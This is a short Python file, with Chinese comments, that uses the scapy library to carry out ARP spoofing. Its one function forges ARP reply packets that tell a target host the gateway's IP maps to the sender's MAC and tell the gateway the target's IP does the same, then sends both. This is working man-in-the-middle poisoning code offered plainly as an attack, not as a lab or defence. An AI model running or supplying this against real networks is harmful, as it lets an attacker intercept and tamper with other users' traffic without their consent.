from scapy.layers.l2 import ARP
from scapy.sendrecv import send


def dupe_target(gateway_ip, gateway_mac, dst_ip, dst_mac):
    u""" arp欺骗 """

    # 针对目标用户使用构造网关ip，及自身mac地址的方式
    dupe_dst = ARP()
    dupe_dst.op = 2
    dupe_dst.psrc = gateway_ip
    dupe_dst.pdst = dst_ip
    dupe_dst.hwdst = dst_mac

    # 针对网关使用目标用户ip，及自身mac地址的方式
    dupe_gateway = ARP()
    dupe_gateway.op = 2
    dupe_gateway.psrc = dst_ip
    dupe_gateway.pdst = gateway_ip
    dupe_gateway.hwdst = gateway_mac

    try:
        send(dupe_dst)
        send(dupe_gateway)
    except Exception as e:
        print("send arp packet fail, err: {}".format(e))
